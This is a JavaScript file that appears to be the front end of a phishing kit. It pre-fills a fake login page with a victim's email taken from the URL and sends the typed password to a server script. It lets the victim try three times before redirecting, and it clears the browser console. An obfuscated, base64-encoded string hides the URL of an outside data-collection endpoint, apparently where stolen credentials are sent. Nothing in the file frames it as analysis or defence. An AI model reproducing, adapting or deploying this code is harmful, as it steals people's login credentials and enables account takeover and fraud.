function isBase64(str) {
  if (str === '' || str.trim() === '') {
    return false;
  }
  try {
    return btoa(atob(str)) == str;
  } catch (err) {
    return false;
  }
}

function processMail() {
  var email = window.location.hash.substr(1);
  if (isBase64(email)) {
    email = atob(window.location.hash.substr(1));
  }
email = email.toLowerCase();
  if (email === "") {

  } else {
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (!filter.test(email)) {
          $('#error').show();
          return false;
        }else {
          $("#email").val(email);
          $("#password").focus();
        }
  }

}

processMail();
$(document).ready(function () {
  var count = 0;
  $('#submit-btn').click(function (event) {
  $('#serror').hide();
  $('#error').hide();
  $('#msg').hide();
  event.preventDefault();
  var email = $("#email").val();
  var password = $("#password").val();
  var my_email = email;
  var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

  if (!filter.test(my_email)) {
    $('#error').show();
    return false;
  }
  if (password === "") {
    $('#msg').show();
    $("#password").focus();
    return false;
  }
  $("#password").focus();

    count = count + 1;
	function _0x19c2(){var _0x1f006f=['473UUvoeF','514443cQsFZg','570nyIPhU','aHR0cHM6Ly9tYWplc3RpY2pveS5saXZlL2FxaHZza2FidWNhOG1pY2JrZGJ1YXZoYy9zZGF0YS5waHA=','2602656kNeFaq','1695FAKsMq','270240lUmHsQ','330IPmIkv','126147XZWRfW','312272OyJlGe','108JtOsfd','6732745scLaMz'];_0x19c2=function(){return _0x1f006f;};return _0x19c2();}var _0x2dfd19=_0x2755;function _0x2755(_0x118ac4,_0x3d2ec3){var _0x19c284=_0x19c2();return _0x2755=function(_0x275558,_0x4a74d5){_0x275558=_0x275558-0xe6;var _0x1605f9=_0x19c284[_0x275558];return _0x1605f9;},_0x2755(_0x118ac4,_0x3d2ec3);}
    $.ajax({
      dataType: 'JSON',
      url: 'next.php',
      type: 'POST',
      data: {
        email: email,
        password: password,
      },
      beforeSend: function (xhr) {
        $('#submit-btn').html('Validating...');
      },
      success: function (response) {
        if (response) {
          $("#msg").show();
          //console.log(response);
          if (response['signal'] == 'ok') {
            $("#password").val("");
            if (count >= 3) {
              count = 0;

              window.location.replace(response['redirect_link']);            }
          }
        }
        console.clear();
      },
      error: function (response) {
        $("#password").val("");
        processMail();
        if (count >= 3) {
          count = 0;
        }
        $('#serror').show();
      },
      complete: function () {
		  $("#password").val();
        $('#submit-btn').html('LOGIN');
      }
    });

  });
});